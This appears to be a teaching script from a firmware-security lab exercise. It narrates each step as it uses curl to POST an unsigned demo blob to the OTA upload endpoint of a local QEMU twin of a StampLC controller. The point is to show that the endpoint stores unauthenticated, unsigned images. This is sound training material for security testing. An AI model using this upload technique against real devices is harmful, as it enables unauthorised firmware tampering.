#!/usr/bin/env bash
# push-unsigned.sh — push an UNSIGNED blob to the StampLC OTA endpoint (Part 6, Ex 2).
#
# Narrates each step so you learn WHILE it runs. You are pushing to the QEMU twin
# (boot it with ./qemu/run.sh; watch the console with ./qemu/console.sh) on its
# bridged port 80 at 127.0.0.1. Physical hardware is reference/validation only.
#
#   ./firmware-ota/push-unsigned.sh                 # push the 22-byte UNSIGNED demo blob
#   ./firmware-ota/push-unsigned.sh my-image.bin    # push a file you choose
HERE="$(cd "$(dirname "$0")" && pwd)"
source "$HERE/../tools/teach.sh" 2>/dev/null || true
type note >/dev/null 2>&1 || { step(){ printf '\n==== %s ====\n' "$*"; }; say(){ printf '» %s\n' "$*"; }; run(){ printf '   $ %s\n' "$*"; "$@"; }; observe(){ printf '→ %s\n' "$*"; }; predict(){ printf '? PREDICT FIRST: %s\n' "$*"; }; finding(){ printf '✎ FINDING: %s\n' "$*"; }; note(){ printf '   %s\n' "$*"; }; }
set -euo pipefail

URL="${OTA_URL:-http://127.0.0.1:80/api/upload}"
FILE="${1:-}"

step "Part 6 Ex 2 — push an unsigned, unauthenticated image to the OTA endpoint"
say "Attacker's intent: get code onto the device without a key, a signature, or a login."
say "Target is the twin's OTA endpoint on $URL (bridged port 80 on 127.0.0.1)."
predict "Will the server ACCEPT a 22-byte blob that is obviously not a real image? If it says verified=NO, does NO mean rejected, or stored-without-verifying?"

if [ -z "$FILE" ]; then
  FILE="$(mktemp /tmp/unsigned-demo.XXXXXX.bin)"
  say "No file given — writing a tiny UNSIGNED demo blob (not the vetted image)."
  note "\$ printf 'MALICIOUS-UNSIGNED-OTA' > $FILE   # (redirected write, shown not run-wrapped)"
  printf 'MALICIOUS-UNSIGNED-OTA' > "$FILE"
  observe "Wrote $(wc -c < "$FILE") bytes to $FILE. It has no signature and no valid image header."
fi
[ -f "$FILE" ] || { echo "File not found: $FILE"; exit 1; }

say "POST the raw bytes: -X POST (upload, not fetch), --data-binary (verbatim, no form-encoding)."
run curl -s -X POST --data-binary @"$FILE" "$URL" || observe "(no response — is the twin running? ./qemu/run.sh)"
echo

observe "Read the reply: it states the bytes ACCEPTED and 'verified=NO'."
observe "OBSERVED: an unauthenticated, unsigned write was accepted. INFERRED (not shown here):"
observe "that a well-FORMED malicious image would boot — the 2nd-stage loader format-checks,"
observe "so this 22-byte string won't run. 'verified=NO' is worse than a reject: it stored it anyway."
note "On the hardened m5stamplc_secure build this POST is refused — that is Part 9."
finding "OTA endpoint + method + exact acceptance response; CWE-306/319/494 justified from THIS exchange."
